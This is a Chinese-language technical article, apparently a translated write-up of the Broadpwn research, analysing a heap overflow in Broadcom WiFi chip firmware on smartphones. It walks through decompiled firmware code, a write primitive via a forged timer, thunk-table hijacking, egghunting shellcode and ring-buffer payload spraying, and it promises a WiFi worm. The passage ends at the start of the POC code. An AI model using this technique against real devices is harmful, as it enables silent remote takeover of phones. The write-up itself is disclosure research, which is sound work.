<p>文末还会有个<b> [&nbsp;彩蛋 ] ：</b>在二十世纪初期，自传播的<span style="font-size: 16px;">蠕虫</span>恶意程序很常见。但随着 DEP 和 ASLR 的出现，这种远程 exp 逐渐消失，2009 年的 Conficker 成为了历史记载中最后一个自传播的网络蠕虫。而利用当前的&nbsp;<span style="font-size: 16px;">Broadpwn&nbsp;</span>我们可以延续传统（:P），将其改造成第一个针对移动设备 WiFi 的蠕虫、同时也是近八年内的第一只公网蠕虫。</p>
<h2>一、攻击面分析</h2>
<p>DEP 和 ASLR 是攻击者最恐惧的两个词。一般为了利用漏洞进行代码注入，我们需要获取涉及地址空间的信息。但自从有了 ASLR 机制的存在，这些信息就很难获取，有些时候需要通过单独的信息泄露漏洞才能获得。以及，普遍意义上远程利用信息泄露漏洞，会比普通情况更难，因为目标与攻击者的交互十分有限。在过去的近十年来，有数百个漏洞因此凄惨“ 死去 ”。</p>
<p>当然，嵌入式系统中不会存在这样的问题，路由器、摄像头、各种IoT设备都不会有专门的安全防护机制。但谈及智能手机，情况就又不一样了：<b>Android 和 iOS 都很早就应用 ASLR 机制了！</b>但直接这样说其实还是有不准确的地方的，因为这些机制只是针对主应用处理器进行保护——然而智能手机本身是一个复杂系统！于是我们在进行研究的时候开始思考，手机上还有哪些不受 ASLR 保护的处理器呢？</p>
<p>实际上，大多数的 Android 和 iOS 智能手机都还有两个额外的处理芯片，这是考虑远程攻击的极好的突破口——<b>基带芯片</b> 和 <b>WiFi 芯片</b>。&nbsp;</p>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170731/15014860804918.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="464.8729446935725" height="500"></p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170731/15014860804918.jpg!small" width="464.8729446935725" height="500"></p></noscript>
<p><b>基带芯片</b>涉及的领域很宽泛也很奇妙，毋庸置疑会吸引很多攻击者。但是，攻击基带也是相当有难度的事情，因为生产厂家各不相同，攻击不得不变得非常零碎。基带市场目前也面临着巨大的转折：多年之前，高通是一览众山小的领先者，但现在的市场已经被多个竞争者占领。三星的Shannon modem在新一代三星手机中得到普及；英特尔的&nbsp;<span style="font-size: 16px;">Infineon&nbsp;</span>芯片已经接替了高通，成为 iPhone 7 以上版本的基带；而联发科技的芯片已经成为低成本    Android 设备最受欢迎的选择。当然，高通仍然占据高端非三星 Android 中基带市场的主导地位。</p>
<p><b>WiFi 芯片组</b>则有着另一段故事：但在最主要的智能手机中，包括三星 Galaxy 型号，Nexus 以及 iPhone 在内，博通对它们来说都是最主要的芯片厂商。在笔记本设备中，WiFi 芯片组管理 PHY 层，而&nbsp;<span style="font-size: 16px;">kernel driver</span> 负责处理 第三层及以上——这被称为&nbsp;<span style="font-size: 16px;">SoftMAC 框架。然而在移动设备上，由于对电源的考虑导致设备设计人员选择应用 FullMAC WiFi 实现方式，这样 WiFi 芯片是自行负责处理 PHY，MAC 和 MLME ，并自行传输准备好的内核驱动程序数据包，这也就是说&nbsp;<b>WiFi 芯片是会自行处理可能被攻击者控制的数据输入</b>。</span></p>
<p>在选择攻击面的考虑时，还有一个因素影响了我们的选择。在博通芯片上进行测试的时候，我们欣喜地发现，它不受 ASLR 保护，而整个 RAM 都有 RWX 许可——这意味着我们可以<b>在内存中的任何地方进行读，写和运行代码的操作！</b>但是在 Shannon 、<span style="font-size: 16px;">联发科技、以及高通的基带中存在 DEP 机制的保护，所以相对而言，更难进行漏洞利用。</span></p>
<h2>二、博通芯片分析</h2>
<p>博通的 &nbsp;WiFi芯片是高端智能手机 WiFi 组的主要选择。在不算特别详尽的研究中，我们发现以下智能手机的型号使用的是博通的 WiFi 芯片：    </p>
<ul>
<li>部分三星 Galaxy 系列的 S3 至 S8</li>
<li>所有三星 Notes 3，Nexus 5, 6, 6X 和 6P</li>
<li>所有 iPhones &nbsp;5 之后的型号</li>
</ul>
<p>芯片的型号则是从 BCM4339 到 BCM4361型号。</p>
<p>芯片固件的逆向工程和调试相对简单，因为每次芯片重制后的主 OS 都将未加密的固件二进制程序加载到芯片的 RAM 中，由此，只是通过手机系统的简单搜索就足以定位博通固件的地址。但如果在 Linux 内核上，这样的路径通常会在配置的变量 BCMDHD_FW_PATH 中定义。</p>
<p>我们之后又发现了另一件让人高兴的事情，固件上并不会对完整性进行检验，也就是说攻击者可以轻松地对原始固件进行修改，添加 hook 进行打印输出调试或者其他行为修改，甚至修改内核来调用我们自己的固件。我们在研究的过程中就经常地放置 hook 并观察系统的行为（更有趣的是系统的不正常行为）。</p>
<p>我们调查中的博通芯片都运行的是&nbsp;<span style="font-size: 16px;">ARM Cortex-R4 微控制器。这个系统的奇怪之处在于，大部分代码都是在 ROM 上运行的，大小为 900 k。而后续的更新都是存放在 RAM 中的，也占 900 k 的大小。在执行更新或修复的时候，在 RAM 中会有一个附加的 thunk 表，然后在执行的特点位置进行调用这个表。如果有错误需要进行修复，则可以对 thunk 表进行重定向指向新代码。</span></p>
<p>而在架构方面，将 BCM43xx 视为 WiFi 片上系统（SoC）应该是正确的，因为这里有两个不同的芯片在处理包数据。主处理器&nbsp;<span style="font-size: 16px;">Cortex-R4 在将收到的包数据交给 Linux 内核之前，会先处理 MAC 和 MLME 层的数据；<span style="font-size: 16px;">但使用专有博通处理器架构的单独芯片则可处理 802.11 PHY 层。SoC的另一个组件是应用处理器的接口：早期的博通芯片使用的是较慢的 SDIO 连接，而 BCM4358及更高版本使用的 PCIe。</span></span></p>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170727/15011479051984.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="427">&nbsp;</p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170727/15011479051984.png!small" width="690" height="427">&nbsp;</p></noscript>
<p style="">WiFi SoC 中的主要 ARM 微控制器运行着 HNDRTE 这个神秘的专有实时操作系统（RTOS） 。虽然 HNDRTE是闭源的，但也有地方可以获取到之前版本的源码。之前的研究人员提及&nbsp;<span style="font-size: 16px;">Linux brcmsmac 驱动程序——它是&nbsp;<span style="font-size: 16px;">SoftMAC WiFi芯片的驱动程序，只会处理 PHY 层的数据，并让内核去执行其他操作。尽管这个驱动中却是包含HNDRTE的常用源码，但我们发现数据包处理的驱动程序代码（我们希望找到漏洞的部分）与固件中的还是明显不同，因此这样的尝试并没能帮上我们。</span></span></p>
<p style="">最有用的资源则是&nbsp;<span style="font-size: 16px;">VMG-1312 的源代码，<span style="font-size: 16px;">VMG-1312 也是使用博通芯片组的路由器，虽然这个产品早已被人们遗忘。尽管之前的&nbsp;<span style="font-size: 16px;">brcmsmac 驱动中包含博通开源使用在 Linux 上的代码，但在<span style="font-size: 16px;">&nbsp;VMG-1312 中居然包含有博通专有的闭源代码，可以看到代码上标注了 “这是博通未公开的专有源代码” 警示信息。显而易见，这是博通代码不小心混在 VMG-1312 源码中错误公开了！</span></span>    </span>    </span></p>
<p style="">这些泄露的代码片段包含我们在固件 blob 中找到的大部分功能。但这部分还是有些过时，没有包含最新的 802.11协议的相关处理方法。但我们找到的这部分对于此次研究已经非常有用，主要的数据包处理功能并没有发生大的变化。我们通过将源代码与固件进行比对，能够快速地获取数据包处理代码部分的整体概念，帮助我们寻找到值得关注的代码区域，并将关注点移到下一个阶段上——如何找到合适可用的漏洞。</p>
<h2>三、漏洞在哪</h2>
<p>在此确认一下“合适可用的漏洞“的定义，我们认为，当前所需要寻找的漏洞应当满足以下的要求：</p>
<blockquote><p>1. 这个漏洞不需要攻击目标进行交互触发</p>
<p>2.不需要我们了解系统的当前状态，因为远程攻击并不能了解足够多的信息</p>
<p>3.成功利用后，这个漏洞还是能让系统保持在稳定状态</p>
</blockquote>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170801/1501563608715.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="500" height="515.2173913043479"></p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170801/1501563608715.jpg!small" width="500" height="515.2173913043479"></p></noscript>
<p>从那里开始思考呢。我们可以先简单回顾一下 802.11 连接过程。这个过程从客户端发起，在 802.11 lingo 中称为移动工作站（STA），会对附近所有的接入点（AP ）发送探测请求（Probe Request）来进行连接。然后探测请求中会包含两种数据，其一是 Supported Rates（移动工作站支持的速率）；其二是该站点之前连接上的 SSID 列表。而在下一个过程中，支持对应速率的 AP 会发送一个探测响应（包含支持的加密类型等数据）。之后，STA 和 AP 都会发送身份认证信息数据包。而在最后一步中，STA 会发送关联请求（Association request ）给选择连接的 AP 。</p>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170731/1501479617662.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="451" height="425"></p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170731/1501479617662.png!small" width="451" height="425"></p></noscript>
<p>在上述过程中的数据包都有相通的结构：基本的 802.11 报头，然后是一些 802.11 信息元素（IE）。信息元素都是以众所周知的 TLV 进行编码，第一个字节标注信息的类型，第二个字节保存长度，最后的字节保存实际的数据。通过解析这个数据，AP 和 STA 都可以在连接过程中获得对方的需求和性能信息。</p>
<p>任何实际认证，如使用 WPA2 的协议进行的认证，都发生在此连接过程之后。由于在连接过程之中并没有真实的认证元素，所以攻击者可以使用 MAC 地址及 SSID 模仿称任何的 AP。STA 只能在下一步的认证过程发现这个 AP 是伪造的。这个特性使得连接过程的这一步中出现的 bug 是非常珍贵的。在连接过程中攻击者如果能发现 bug ，就可以嗅探到目标设备的探测请求，伪装成 STA 在搜索的 AP ，然后无需认证即可触发漏洞。</p>
<p>博通代码高度模块化地处理 802.11 中不同协议及固件中函数这一点，也给我们寻找漏洞提供了便利。在&nbsp;<span style="font-size: 16px;">wlc_attach_module 函数中，它将不同的协议和功能抽象成一个单独的模块。&nbsp;<span style="font-size: 16px;">wlc_attach_module 调用的</span>各种初始化函数的名称能够给一些指导，下面是例子：</span></p>
<pre><code>prot_g = wlc_prot_g_attach(wlc);
wlc-&gt;prot_g = prot_g;
if (!prot_g) {
&nbsp; goto fail;
}
prot_n = wlc_prot_n_attach(wlc);
wlc-&gt;prot_n = prot_n;
if (!prot_n) {
&nbsp; goto fail;
}
ccx = wlc_ccx_attach(wlc);
wlc-&gt;ccx = ccx;
if (!ccx) { 
  goto fail;
}
amsdu = wlc_amsdu_attach(wlc);
wlc-&gt;amsdu = amsdu;
if (!amsdu) {
  goto fail;
}<br /></code></pre>
<p>在模块初始化函数之后才是相关处理操作的程序部分，每次产生或者收到数据包时都会调用这些函数来进行处理。他们会负责匹配接受到分组数据的上下文，或生成用于输出分组的协议数据。我们会更在意协议数据，因为这是解析攻击者控制的数据代码，相关函数在 wlc_iem_add_parse_fn 中，具有如下的原型：</p>
<pre><code>void wlc_iem_add_parse_fn(iem_info *iem, uint32 subtype_bitfield,
                           uint32 iem_type, callback_fn_t fn, void *arg)</code></pre>
<p>我们很快就可以发现，<span style="font-size: 16px;">wlc_iem_add_parse_fn 在&nbsp;<span style="font-size: 16px;">wlc_module_attach 得到了调用。通过编写代码来解析传递的参数，我们可以为连接过程的每个阶段创建一个被调用的解析器列表。然后通过缩小范围，提高研究效率，发现问题关键。</span></span></p>
<h2>四、漏洞所在</h2>
<p>无线多媒体扩展（WMM）是802.11标准的服务质量（QoS）扩展，使得接入点可以根据不同的接入类别（如语音，视频或其他）对流量进行优先级排序。举例来说，WMM 被用于在对数据流量高需求的应用（例如 VoIP 或流视频）中使用，以确保最佳服务质量。在客户端与 AP 的关联过程中，STA 和 AP 都会以信息<span style="font-size: 16px;">元素（IE）</span>添加&nbsp;<span style="font-size: 16px;">WMM 支持级别标识到信标、</span>探测请求、探测响应、关联请求和关联响应分组的末尾。</p>
<p>在我们分析由 wlc_iem_add_parse_fn 安装之后解析关联数据包的函数中的 bug 时，我们偶然发现了以下的函数：</p>
<pre><code>void wlc_bss_parse_wme_ie(wlc_info *wlc, ie_parser_arg *arg) {
  unsigned int frame_type;&nbsp; 
  wlc_bsscfg *cfg;&nbsp; 
  bcm_tlv *ie;&nbsp; 
  unsigned char *current_wmm_ie;&nbsp; 
  int flags;
  frame_type = arg-&gt;frame_type;&nbsp; 
  cfg = arg-&gt;bsscfg;&nbsp; 
  ie = arg-&gt;ie;&nbsp; 
  current_wmm_ie = cfg-&gt;current_wmm_ie;&nbsp; 
  if ( frame_type == FC_REASSOC_REQ )&nbsp;{&nbsp; &nbsp; 
    ...&nbsp; &nbsp; 
    &lt;handle reassociation requests&gt;&nbsp; &nbsp; 
    ...&nbsp; }&nbsp; 
  if ( frame_type == FC_ASSOC_RESP )&nbsp;{&nbsp; &nbsp; 
    ...&nbsp; &nbsp; 
    if ( wlc-&gt;pub-&gt;_wme ) {&nbsp; &nbsp; &nbsp; 
      if ( !(flags &amp; 2) )&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; 
        ...&nbsp; &nbsp; &nbsp; &nbsp; 
        if ( ie )&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
          ...&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
          cfg-&gt;flags |= 0x100u;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
          memcpy(current_wmm_ie, ie-&gt;data, ie-&gt;len);</code></pre>
<p>最后一行的程序调用了 memcpy()，却没有验证缓冲区&nbsp;<span style="font-size: 16px;">current_wmm_ie 是否能容纳数据&nbsp;<span style="font-size: 16px;">ie-&gt;len 。现在把这个问题称为 bug 可能还为时太早：让我们先看看现在分配给 &nbsp;<span style="font-size: 16px;">current_wmm_ie 的大小，调查一下是否会引起溢出。然后我们可以在分配缓冲区的函数中找到答案。</span></span>    </span></p>
<pre><code>wlc_bsscfg *wlc_bsscfg_malloc(wlc_info *wlc) {&nbsp; 
  wlc_info *wlc;&nbsp; 
  wlc_bss_info *current_bss;&nbsp; 
  wlc_bss_info *target_bss;&nbsp; 
  wlc_pm_st *pm;&nbsp; 
  wmm_ie *current_wmm_ie;
  ...&nbsp; 
  current_bss = wlc_calloc(0x124);&nbsp; 
  wlc-&gt;current_bss = current_bss;&nbsp; 
  if ( !current_bss )&nbsp;{&nbsp; &nbsp; 
    goto fail;&nbsp; }&nbsp; 
  target_bss = wlc_calloc(0x124);&nbsp; 
  wlc-&gt;target_bss = target_bss;&nbsp; 
  if ( !target_bss ) {&nbsp; &nbsp; 
    goto fail;&nbsp; }&nbsp; 
  pm = wlc_calloc(0x78);&nbsp; 
  wlc-&gt;pm = pm;&nbsp; 
  if ( !pm )&nbsp;{&nbsp; &nbsp; 
    goto fail;&nbsp; }&nbsp; 
  current_wmm_ie = wlc_calloc(0x2C);&nbsp; 
  wlc-&gt;current_wmm_ie = current_wmm_ie;&nbsp; 
  if ( !current_wmm_ie ) {&nbsp; &nbsp; 
    goto fail;&nbsp; }<br /></code></pre>
<p>current_wmm_ie 缓冲区的大小为&nbsp;<span style="font-size: 16px;">0x2c（44）字节，而整个 IE 的最大尺寸为&nbsp;<span style="font-size: 16px;">0xff (255) 字节，这意味着我们可以得到的最大溢出可以达到 211 字节。</span></span>    </p>
<p>但这样的溢出不一定会让我们实现目标。以前的&nbsp;<span style="font-size: 16px;">CVE-2017-0561（TDLS 问题）很难利用，因为攻击者最多只能溢出到下一个堆，也还需要很复杂的堆技巧<span style="font-size: 16px;">来获得写入原语的权利，同时破坏堆的状态及恢复执行还会更难。据我们目前所知，现在这个 bug 可能也会这样叫人白费力气，所以需要先仔细看看这里溢出的是什么。</span></span></p>
<p>假设<span style="font-size: 16px;">&nbsp;</span>malloc() 函数自顶向下分配内存块，通过查看前文的代码中搜索，我们可以发现&nbsp;<span style="font-size: 16px;">wlc-&gt;pm 结构体就会分配到存储空间，紧挨<span style="font-size: 16px;">&nbsp;</span><span style="font-size: 16px;">wlc-&gt;current_wmm_ie 结构体（溢出目标）之后。为了验证这个假设，我们把&nbsp;<span style="font-size: 16px;">current_wmm_ie 转换成16 进制，在&nbsp;<span style="font-size: 16px;">BCM4359 上进行测试的话可以发现——它总是会分配在&nbsp;<span style="font-size: 16px;">0x1e7dfc 位置：</span></span>    </span>    </span>    </span></p>
<pre><code>00000000: 00 50 f2 02 01 01 00 00 03 a4 00 00 27 a4 00 00 &nbsp;.P..........'...
00000010: 42 43 5e 00 62 32 2f 00 00 00 00 00 00 00 00 00 &nbsp;BC^.b2/.........
00000020: c0 0b e0 05 0f 00 00 01 00 00 00 00 7a 00 00 00 &nbsp;............z...
00000030: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;................
00000040: 64 7a 1e 00 00 00 00 00 b4 7a 1e 00 00 00 00 00 &nbsp;dz.......z......
00000050: 00 00 00 00 00 00 00 00 c8 00 00 00 c8 00 00 00 &nbsp;................
00000060: 00 00 00 00 00 00 00 00 9c 81 1e 00 1c 81 1e 00 &nbsp;................
00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;................
00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;................
00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;................
000000a0: 00 00 00 00 00 00 00 00 2a 01 00 00 00 c0 ca 84 &nbsp;........*.......
000000b0: ba b9 06 01 0d 62 72 6f 61 64 70 77 6e 5f 74 65 &nbsp;.....broadpwn_te
000000c0: 73 74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;st..............
000000d0: 00 00 00 00 00 00 fb ff 23 00 0f 00 00 00 01 10 &nbsp;........#.......
000000e0: 01 00 00 00 0c 00 00 00 82 84 8b 0c 12 96 18 24 &nbsp;...............$
000000f0: 30 48 60 6c 00 00 00 00 00 00 00 00 00 00 00 00 &nbsp;0H`l............<br /></code></pre>
<p>看一下 0x2c ，这里是&nbsp;<span style="font-size: 16px;">current_wmm_ie 的末尾，我们可以看到下一个堆块的大小&nbsp;<span style="font-size: 16px;">0x7a ——这也是&nbsp;<span style="font-size: 16px;">wlc-&gt;pm 结构体加上两个字节大小的间隔所占的大小。所以我们的假设是正确的：<b>溢出只能用在<span style="font-size: 16px;">wlc_pm_st 类型的结构体</span>&nbsp;    <span style="font-size: 16px;">wlc-&gt;pm 中。</span> </b>    </span>    </span>    </span></p>
<p>但值得注意的是，<span style="font-size: 16px;">current_wmm_ie 和 pm 的</span>位置是静态的、完全固定的。由于这些结构在初始化过程中得到了提前的分配，他们会始终被分配到相同的内存地址。这个特点可以让攻击者在这一步不用思考复杂策略。</p>
<h2>五、漏洞利用 Exploit</h2>
<p>找到漏洞还算是轻松的部分，写一个可靠的远程利用方法更艰难一些，有时发现的漏洞很难被利用。    </p>
<p>编写远程攻击的主要困难在于需要攻击目标的地址空间信息，其次是有些小错误会导致不可收场：在内核远程攻击中，任何错误步骤都会导致内核恐慌，受害者就会接到警告消息。</p>
<p>而在博通 Broadpwn 之中，这些困难之处万幸都能够解决：首先，在漏洞利用中我们用到的相关结构体的地址和数据都在固件中是给定的，这样，我们不需要进行动态地址分配的处理。其次，芯片<span style="font-size: 16px;">崩溃</span>不会带来很多噪声，用户只会看到在用户界面上的 WiFi 图标消失，芯片复位时会出现暂时的连接中断。</p>
<p>这样我们就可以<span style="font-size: 16px;">针对这个固件</span>顺利地建立地址字典，然后不断启动 exp 暴力破解出正确的地址集。</p>
<p>我们再来看下如何进行<span style="font-size: 16px;">&nbsp;写入原语（write primitive） 的获取。溢出的结构类型为<span style="font-size: 16px;">&nbsp;wlc_pm_st 这可以改变电源的管理状态（进入／离开节电模式）这个结构按照如下进行了定义：</span></span></p>
<pre><code>typedef struct wlc_pm_st { 
  uint8 PM; bool PM_override; 
  mbool PMenabledModuleId; 
  bool PMenabled; 
  bool PMawakebcn; 
  bool PMpending; 
  bool priorPMstate; 
  bool PSpoll; 
  bool check_for_unaligned_tbtt; 
  uint16 pspoll_prd; 
  struct wl_timer *pspoll_timer; 
  uint16 apsd_trigger_timeout; 
  struct wl_timer *apsd_trigger_timer; 
  bool apsd_sta_usp; 
  bool WME_PM_blocked; 
  uint16 pm2_rcv_percent; 
  pm2rd_state_t pm2_rcv_state; 
  uint16 pm2_rcv_time; 
  uint pm2_sleep_ret_time; 
  uint pm2_sleep_ret_time_left;&nbsp; 
  uint pm2_last_wake_time; 
  bool pm2_refresh_badiv; 
  bool adv_ps_poll; 
  bool send_pspoll_after_tx; &nbsp;&nbsp; 
  wlc_hwtimer_to_t *pm2_rcv_timer;&nbsp; 
  wlc_hwtimer_to_t *pm2_ret_timer;&nbsp;
} wlc_pm_st_t;<br /></code></pre>
<p>这个结构体之中的四个成员变量很有意思呢，可以被攻击者利用：pspoll_timer、 &nbsp;wl_timer 类型的 apsd_trigger_timer，pm2_rcv_timer 和wlc_hwtimer_to_t 类型的 pm2_ret_timer。    </p>
<pre><code>typedef struct _wlc_hwtimer_to { 
  struct _wlc_hwtimer_to *next; 
  uint timeout; hwtto_fn fun; 
  void *arg; bool expired;
} wlc_hwtimer_to_t;</code></pre>
<p>在处理数据包和触发溢出之后，函数&nbsp;<span style="font-size: 16px;">wlc_hwtimer_del_timeout 会被调用，同时接收到&nbsp;<span style="font-size: 16px;">pm2_ret_timer 为参数：</span></span></p>
<pre><code>void wlc_hwtimer_del_timeout(wlc_hwtimer_to *newto) {&nbsp; 
  wlc_hwtimer_to *i;&nbsp; 
  wlc_hwtimer_to *next;&nbsp;&nbsp; 
  wlc_hwtimer_to *this;
  for ( i = &amp;newto-&gt;gptimer-&gt;timer_list; ; i = i-&gt;next )&nbsp; {&nbsp; &nbsp; 
    this = i-&gt;next;&nbsp; &nbsp; 
    if ( !i-&gt;next )&nbsp;{&nbsp; &nbsp; &nbsp; 
      break; }&nbsp; &nbsp; 
    if ( this == newto )&nbsp;{&nbsp; &nbsp; &nbsp; 
      next = newto-&gt;next;&nbsp; &nbsp; &nbsp; 
      if ( newto-&gt;next )&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; 
        next-&gt;timeout += newto-&gt;timeout; // write-4 primitive&nbsp; &nbsp;
      }&nbsp; &nbsp; &nbsp; 
      i-&gt;next = next;&nbsp; &nbsp; &nbsp; 
      this-&gt;fun = 0;&nbsp; &nbsp; &nbsp; 
      return;&nbsp; &nbsp; 
    }&nbsp; 
  }
}</code></pre>
<p>我们从代码中可以看出，通过覆盖&nbsp;<span style="font-size: 16px;">newto 的值，并指向攻击者控制的位置，<span style="font-size: 16px;">next-&gt;timeout 所指向的</span>内存位置就可以增加&nbsp;<span style="font-size: 16px;">newto-&gt;timeout 的内容。这就是一个 &#8211; 在哪里写入什么 &#8211; 的原语，但这样做会有个限制，就是攻击者必须知道被覆盖内存位置上的原始内容。</span></span></p>
<p>还有另一种限制更少的原语写入方法，就是通过&nbsp;struct wl_timer 类型的&nbsp;pspoll_timer 成员。这个结构体能在相关过程中定期触发的回调函数进行处理：    </p>
<pre><code>int timer_func(struct wl_timer *t) {&nbsp; 
  prev_cpsr = j_disable_irqs();&nbsp; 
  v3 = t-&gt;field_20;&nbsp;&nbsp;&nbsp; 
  ...
  if ( v3 ) {&nbsp; &nbsp; 
    v7 = t-&gt;field_18;&nbsp; &nbsp; 
    v8 = &amp;t-&gt;field_8;&nbsp; &nbsp; 
    if ( &amp;t-&gt;field_8 == v7 )&nbsp;{
      ... 
    }&nbsp;else&nbsp;{&nbsp; &nbsp; &nbsp; 
      v9 = t-&gt;field_1c;&nbsp; &nbsp; &nbsp; 
      v7-&gt;field_14 = v9;&nbsp; &nbsp; &nbsp; 
      *(v9 + 16) = v7;&nbsp; &nbsp; &nbsp; 
      if ( *v3 == v8 )&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; 
        v7-&gt;field_18 = v3;&nbsp;
      }&nbsp; &nbsp; 
    }&nbsp; &nbsp; 
    t-&gt;field_20 = 0;&nbsp; 
  }&nbsp; 
  j_restore_cpsr(prev_cpsr);&nbsp; 
  return 0;
}<br /></code></pre>
<p>从这个函数的末尾可以看到，在这里其实可以更方便地获取写入原语。我们可以将我们存储在field_1c中的值写入我们存储在 field_18 中的地址。这样，我们可以将任意值写入任何内存地址，而不会受到前一种方法的限制。</p>
<p>下一个问题就在于，如何将我们的写入原语用于完整的代码执行。为此，可以考虑两种方法：一种是需要我们事先知道固件内存地址（或通过暴力破解获取），还有一种更难实现的方法。我们先看一下前一种方法。</p>
<p><span style="font-size: 16px;">为了实现写入原语，<span style="font-size: 16px;">我们需要用控制的内存地址覆盖 pspoll_timer。<span style="font-size: 16px;">由于wlc-&gt; current_wmm_ie 和 wlc-&gt; ps 的地址对于给定的固件版本是已知且和一致的，我们可以完全覆盖其内容，因此我们可以将 pspoll_timer 设置为指向这些对象内的任何位置。<span style="font-size: 16px;">为了创建一个虚假的wl_timer对象，<span style="font-size: 16px;">wlc-&gt; current_wmm_ie和wlc-&gt; ps之间的未使用的区域是最理想的选择。把我们自己伪造的 timer 对象放入，然后让&nbsp;<span style="font-size: 16px;">field_18 指向 我们希望覆盖的位置（减去14的偏移量），然后在&nbsp;<span style="font-size: 16px;">field_1c 中保存我们需要覆盖的内容。一旦触发覆盖操作，我们只需要等待timer 函数被调用，就会执行覆盖操作。</span></span>    </span>    </span>    </span>    </span>    </span></p>
<p>再下一步就是需要确定哪个内存的地址是我们想要覆盖的。在上述的函数中出触发覆盖操作之后，立刻会调用用&nbsp;<span style="font-size: 16px;">j_restore_cpsr 操作。这个函数主要就做一件事情：它会在 RAM 的&nbsp;<span style="font-size: 16px;">thunk 表中，<span style="font-size: 16px;">从 thunk 表中提取 restore_cpsr 的地址，并跳转过去。因此，<span style="font-size: 16px;">通过覆盖 thunk 表中的 restore_cpsr 的索引，我们可以使我们自己的函数立刻被调用。</span></span>    </span>    </span></p>
<p><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;">目前为止，我们现在已经获得了对指令指针的控制，并且完全掌握了跳转到任意存储地址的权利。整个RAM是 RWX 的，也没有对内存权限的限制，这也就是说，我们可以从堆，栈或者任何之中执行任意代码。但还会有存在一个问题，shellcode放哪里比较好呢？<span style="font-size: 16px;">我们可以将shellcode写入到溢出的那个 wlc-&gt; pm 结构体中，但这带来了两个难点：首先，空间受到 211 字节覆盖的限制。第二， wlc-&gt; pm 结构不断被 HNDRTE 代码的其他部分使用，所以 shellcode 在结构体中的错误位置会导致整个系统崩溃。</span></span>    </span>    </span>    </span></p>
<p><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;">经过了失败之后，我们意识能用的代码空间很小：wlc-&gt; pm 结构中的 12 个字节（不会引发崩溃的唯一位置），在放 SSID 字符串的相邻结构体中的&nbsp;</span>    <span style="font-size: 16px;">32 个字节</span><span style="font-size: 16px;">（可自由覆盖）。总计 44 字节的空间不能容纳我们的payload，所以需要找个别的地方。</span>    <br /> </span>    </span>    </span>    </span>    </span></p>
<p>正确的方案应该是寻找某种操作方法（&nbsp;spray primitive） ：我们需要一种方法来在大块内存中进行内容写入，并给我们便利而可预测的位置来存储我们的 payload。</p>
<p>WiFi 芯片都需要在给定的时间里处理许多数据包。为此，HNDRTE 提供了D11 芯片和主微控制器通用的环形缓冲方式。包数据通过 PHY 后被重复写入缓冲区，直到不能再容纳，也就是说，新数据包只是简单地写入缓冲区的开始部分，并覆盖了之前的数据。</p>
<p>所以，我们需要做的就是把我们的 payload 广播传输过来，在多个频道上播放。<span style="font-size: 16px;">随着 WiFi 芯片反复扫描可用的 AP（即使在芯片处于省电模式下也同样如此），环形缓冲区就会被我们的 payload 填充 &#8211; 给我们提供了很好的解决方案。</span></p>
<p><span style="font-size: 16px;">因此，我们将要做的是：在 wlc-&gt; pm 中写入一个小型的 shellcode ，这样可以节省堆栈帧（这样我们才能恢复正常执行），并跳转到我们存储的下一个32 字节的 shellcode 的 SSID 字符串。这个 shellcode 只是经典的 egghunting shellcode，在环形缓冲区中搜索某个数字，指示 payload 的开始，并跳转过去。</span></p>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170728/15012248193967.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="388">&nbsp;</p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170728/15012248193967.png!small" width="690" height="388">&nbsp;</p></noscript>
<p style=""><b style="color: rgb(239, 71, 71);">接下来看一下 POC 代码吧。</b>    </p>
<pre><code>u8 *generate_wmm_exploit_buf(u8 *eid, u8 *pos) {&nbsp; 
  uint32_t curr_len = (uint32_t) (pos - eid);&nbsp; 
  uint32_t overflow_size = sizeof(struct exploit_buf_4359);&nbsp; 
